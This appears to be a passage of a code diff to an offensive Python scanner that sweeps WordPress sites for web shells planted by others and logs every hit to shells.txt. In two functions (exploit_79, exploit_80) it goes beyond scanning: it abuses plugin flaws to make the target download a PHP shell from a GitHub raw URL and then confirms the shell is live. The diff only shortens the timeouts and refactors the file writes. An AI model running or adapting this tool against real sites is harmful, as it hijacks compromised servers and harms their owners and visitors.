-        check = requests.get(url+'/wp-includes/class-wp-customize-nav-menus-core.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-customize-nav-menus-core.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 68 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-nav-menus-core.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-nav-menus-core.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-customize-nav-menus-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-customize-nav-menus-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 68 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-nav-menus-core.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-nav-menus-core.php')
             else:
                 print ('[#] Exploit 68 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1539,17 +1539,17 @@ def exploit_69(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-image-control-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-image-control-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 69 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-image-control-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-image-control-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-image-control-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-image-control-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 69 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-image-control-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-image-control-private.php')
             else:
                 print ('[#] Exploit 69 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1561,17 +1561,17 @@ def exploit_70(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/block-patterns/two-buttons-core.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/block-patterns/two-buttons-core.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 70 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/block-patterns/two-buttons-core.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/block-patterns/two-buttons-core.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/block-patterns/two-buttons-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/block-patterns/two-buttons-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 70 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/block-patterns/two-buttons-core.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/block-patterns/two-buttons-core.php')
             else:
                 print ('[#] Exploit 70 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1583,17 +1583,17 @@ def exploit_71(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/embed-template-core.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/embed-template-core.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 71 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/embed-template-core.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/embed-template-core.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/embed-template-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/embed-template-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 71 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/embed-template-core.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/embed-template-core.php')
             else:
                 print ('[#] Exploit 72 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1605,17 +1605,17 @@ def exploit_72(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/IXR/class-IXR-date-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/IXR/class-IXR-date-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 72 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/IXR/class-IXR-date-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/IXR/class-IXR-date-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/IXR/class-IXR-date-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/IXR/class-IXR-date-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 72 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/IXR/class-IXR-date-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/IXR/class-IXR-date-stream.php')
             else:
                 print ('[#] Exploit 72 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1627,17 +1627,17 @@ def exploit_73(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/theme-compat/wp-aespa.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/theme-compat/wp-aespa.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 73 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/theme-compat/wp-aespa.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/theme-compat/wp-aespa.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/theme-compat/wp-aespa.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/theme-compat/wp-aespa.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 73 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/theme-compat/wp-aespa.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/theme-compat/wp-aespa.php')
             else:
                 print ('[#] Exploit 73 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1649,17 +1649,17 @@ def exploit_74(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 74 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/rest-api/tablepress_controllers.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 74 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/rest-api/tablepress_controllers.php')
             else:
                 print ('[#] Exploit 74 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1670,17 +1670,17 @@ def exploit_75(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 75 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/http-ajax-response.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 75 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/http-ajax-response.php')
             else:
                 print ('[#] Exploit 75 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1692,17 +1692,17 @@ def exploit_76(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 76 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/rest-api/tablepress_controllers.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/rest-api/tablepress_controllers.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 76 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/rest-api/tablepress_controllers.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/rest-api/tablepress_controllers.php')
             else:
                 print ('[#] Exploit 76 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1714,17 +1714,17 @@ def exploit_77(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/shell20211028.php',headers=headers, allow_redirects=True,timeout=5)
         if "<input type=hidden name=p1 value='uploadFile'>" in check.content.decode("utf-8"):
                 print (' [#] Exploit 77 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/shell20211028.php\n')
+                write_to_file('shells.txt', url + '/shell20211028.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "<input type=hidden name=p1 value='uploadFile'>" in check.content.decode("utf-8"):
                     print (' [#] Exploit 77 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/shell20211028.php\n')
+                    write_to_file('shells.txt', url + '/shell20211028.php')
             else:
                 print ('[#] Exploit 77 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1736,17 +1736,17 @@ def exploit_78(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/index.php?x=ooo',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/index.php?x=ooo',headers=headers, allow_redirects=True,timeout=5)
         if "<input type='file'name='file' /><input type='submit' value='up' />" in check.content.decode("utf-8"):
                 print (' [#] Exploit 78 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/index.php?x=ooo\n')
+                write_to_file('shells.txt', url + '/wp-content/index.php?x=ooo')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/index.php?x=ooo',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/index.php?x=ooo',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "<input type='file'name='file' /><input type='submit' value='up' />" in check.content.decode("utf-8"):
                     print (' [#] Exploit 78 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/index.php?x=ooo\n')
+                    write_to_file('shells.txt', url + '/wp-content/index.php?x=ooo')
             else:
                 print ('[#] Exploit 78 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1758,17 +1758,17 @@ def exploit_79(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
         if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                 print (' [#] Exploit 79 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
+                write_to_file('shells.txt', url + '/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                     print (' [#] Exploit 79 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
+                    write_to_file('shells.txt', url + '/xmlrp.php?url=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php')
             else:
                 print ('[#] Exploit 79 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1780,19 +1780,19 @@ def exploit_80(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check0 = requests.get(url+'/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
-        check = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
+        check0 = requests.get(url+'/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
+        check = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
         if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                 print (' [#] Exploit 80 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check0 = requests.get(url+'/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
-            check = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check0 = requests.get(url+'/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
+            check = requests.get(url+'/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                     print (' [#] Exploit 80 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/wp-mobile-detector/cache/h0rn3t.php')
             else:
                 print ('[#] Exploit 80 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1804,17 +1804,17 @@ def exploit_81(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/SYSADMIN-CMQDSR.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/SYSADMIN-CMQDSR.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 81 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/SYSADMIN-CMQDSR.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/SYSADMIN-CMQDSR.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/SYSADMIN-CMQDSR.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/SYSADMIN-CMQDSR.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 81 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/SYSADMIN-CMQDSR.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/SYSADMIN-CMQDSR.php')
             else:
                 print ('[#] Exploit 81 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1826,17 +1826,17 @@ def exploit_82(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 82 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/backups-dup-lite/dup-installer/main.installer.php\n')
+                write_to_file('shells.txt', url + '/backups-dup-lite/dup-installer/main.installer.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 82 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/backups-dup-lite/dup-installer/main.installer.php\n')
+                    write_to_file('shells.txt', url + '/backups-dup-lite/dup-installer/main.installer.php')
             else:
                 print ('[#] Exploit 82 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1851,17 +1851,17 @@ def exploit_83(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 83 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/606.php\n')
+                write_to_file('shells.txt', url + '/606.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 83 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/606.php\n')
+                    write_to_file('shells.txt', url + '/606.php')
             else:
                 print ('[#] Exploit 83 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1873,17 +1873,17 @@ def exploit_84(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 84 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/404.php\n')
+                write_to_file('shells.txt', url + '/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 84 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/404.php\n')
+                    write_to_file('shells.txt', url + '/404.php')
             else:
                 print ('[#] Exploit 84 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1896,17 +1896,17 @@ def exploit_85(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 85 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/cgi-bin/bp.php\n')
+                write_to_file('shells.txt', url + '/cgi-bin/bp.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 85 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/cgi-bin/bp.php\n')
+                    write_to_file('shells.txt', url + '/cgi-bin/bp.php')
             else:
                 print ('[#] Exploit 85 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1919,17 +1919,17 @@ def exploit_86(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 86 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/cgi-bin/403.php\n')
+                write_to_file('shells.txt', url + '/cgi-bin/403.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 86 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/cgi-bin/403.php\n')
+                    write_to_file('shells.txt', url + '/cgi-bin/403.php')
             else:
                 print ('[#] Exploit 86 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1941,17 +1941,17 @@ def exploit_87(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 87 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/403.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/403.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 87 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/403.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/403.php')
             else:
                 print ('[#] Exploit 87 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1963,17 +1963,17 @@ def exploit_88(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 88 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wordpress/241.php\n')
+                write_to_file('shells.txt', url + '/wordpress/241.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 88 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wordpress/241.php\n')
+                    write_to_file('shells.txt', url + '/wordpress/241.php')
             else:
                 print ('[#] Exploit 88 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1985,17 +1985,17 @@ def exploit_89(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 89 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/24.php\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/pridmag/24.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 89 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/24.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/themes/pridmag/24.php')
             else:
                 print ('[#] Exploit 89 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2007,17 +2007,17 @@ def exploit_90(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,timeout=15)
